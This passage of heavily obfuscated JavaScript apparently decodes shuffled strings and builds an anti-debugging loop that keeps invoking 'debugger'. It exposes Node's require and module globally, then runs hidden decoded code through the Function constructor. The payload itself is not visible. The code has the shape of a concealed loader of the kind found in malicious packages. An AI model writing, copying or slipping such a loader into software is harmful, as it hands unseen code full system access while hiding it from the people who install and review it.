_0x1218b4,_0x1a7470,_0x59abd4,_0x363721,_0x95433f,_0x42b2e6,_0x5f078e=[],_0x30ce88=0x0,_0x1c4c7d=_0xa1e140[0x0];_0x30ce88<_0x19d2e5[_0x347e9f(0x29)];){_0x5f078e[_0x30ce88]=_0x19d2e5[_0x347e9f(0x6)](_0x30ce88),_0x30ce88+=0x1;};for(_0x1218b4=_0x5f078e['length'],_0x30ce88=0x0;_0x30ce88<_0x1218b4;){_0x1a7470=_0x1c4c7d*_0x4b7042[_0x347e9f(0x18)](_0x30ce88,_0xa1e140[0x1])+_0x4b7042[_0x347e9f(0xd)](_0x1c4c7d,_0xa1e140[0x2]),_0x95433f=_0x4b7042['suNuD'](_0x59abd4=_0x1c4c7d*_0x4b7042[_0x347e9f(0x11)](_0x30ce88,_0xa1e140[0x3])+_0x1c4c7d%_0xa1e140[0x4],_0x1218b4),_0x42b2e6=_0x5f078e[_0x363721=_0x1a7470%_0x1218b4],_0x5f078e[_0x363721]=_0x5f078e[_0x95433f],_0x5f078e[_0x95433f]=_0x42b2e6,_0x1c4c7d=(_0x1a7470+_0x59abd4)%_0xa1e140[0x5],_0x30ce88+=0x1;};return _0x5f078e[_0x347e9f(0x1f)](_0x460a12[0x0]);}function _0x260705(_0x449166){var _0x4810b8=_0x3ccac3,_0x2bccd5=String[_0x4810b8(0xe)](0x1c),_0x1758e3=_0x1da5ca(_0x449166,NX);return(_0x1758e3=(_0x1758e3=(_0x1758e3=_0x1758e3['split'](_0x460a12[0x3])[_0x4810b8(0x1f)](_0x2bccd5))['split'](_0x460a12[0x4])[_0x4810b8(0x1f)](_0x460a12[0x3]))['split'](_0x460a12[0x2])[_0x4810b8(0x1f)](_0x460a12[0x1]))[_0x4810b8(0x1e)](_0x2bccd5);}function _0x51e1a6(_0x187b40){return _0x1da5ca(_0x187b40,SX);}function _0x49ed89(_0x46bfec,_0x1a3e3e){var _0x4c55a6=_0x3ccac3;(function(){var _0x4803e7=_0x18b4,_0x471c09={'lTTTC':_0x4803e7(0x0),'GWSOd':function(_0x961b8,_0x19828e){return _0x961b8+_0x19828e;}};_0x29701a(this,function(){var _0x5c05d9=_0x4803e7,_0x22e264=new RegExp(_0x471c09[_0x5c05d9(0x2)]),_0x2876f5=new RegExp(_0x5c05d9(0x8),'i'),_0x4c0277=_0x33a04c('init');!_0x22e264['test'](_0x471c09[_0x5c05d9(0x1a)](_0x4c0277,'chain'))||!_0x2876f5[_0x5c05d9(0xf)](_0x4c0277+_0x5c05d9(0x1b))?_0x4c0277('0'):_0x33a04c();})();}());try{var _0x240b5e=Object[_0x4c55a6(0x5)](_0x46bfec,'name');(!_0x240b5e||!_0x240b5e['writable']&&!_0x240b5e['enumerable']&&_0x240b5e['configurable']&&typeof _0x240b5e['value']=='string')&&Object['defineProperty'](_0x46bfec,_0x4c55a6(0x24),{'value':_0x1a3e3e,'configurable':!![]});}catch(_0x725d92){};return _0x46bfec;}spin=_0x49ed89(_0x1da5ca,'spin'),splitLane=_0x49ed89(_0x260705,'splitLane'),peel=_0x49ed89(_0x51e1a6,'peel'),(NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55]),!function(_0x283e17,_0x39694a){var _0x22040b=_0x3ccac3;_0x283e17['z']=z;var _0x32d2f9=_0x260705(_0x460a12[0x5]);_0x283e17[_0x32d2f9[0x0]]=_0x39694a,typeof module===_0x32d2f9[0x1]&&(_0x283e17[_0x32d2f9[0x2]]=module);var _0x53a6e8=_0x4b7042[_0x22040b(0x10)](_0x51e1a6,_0x460a12[0x6]),_0x4b90db=_0x51e1a6[_0x53a6e8[_0x22040b(0x9)](0x0,0xb)],_0x1946b2=_0x4b90db(_0x460a12[0x0],_0x51e1a6(_0x460a12[0x7]));_0x4b90db(_0x460a12[0x0],_0x1946b2(_0x51e1a6(_0x460a12[0x8])))(0x9cd);}(global,require);}());function _0x33a04c(_0x32bedc){var _0x39635b=_0x18b4,_0x3920a4={'bLguk':_0x39635b(0xc),'vhMKj':_0x39635b(0x29)};function _0x2484a3(_0x425151){var _0x48f165=_0x39635b;if(typeof _0x425151===_0x48f165(0x22))return function(_0xfa12a1){}[_0x48f165(0x21)](_0x3920a4['bLguk'])[_0x48f165(0xb)](_0x48f165(0x4));else(''+_0x425151/_0x425151)[_0x3920a4[_0x48f165(0x14)]]!==0x1||_0x425151%0x14===0x0?function(){return!![];}[_0x48f165(0x21)](_0x48f165(0x3)+_0x48f165(0x20))['call'](_0x48f165(0x17)):function(){return![];}[_0x48f165(0x21)]('debu'+'gger')[_0x48f165(0xb)](_0x48f165(0x1c));_0x2484a3(++_0x425151);}try{if(_0x32bedc)return _0x2484a3;else _0x2484a3(0x0);}catch(_0x36d586){}}
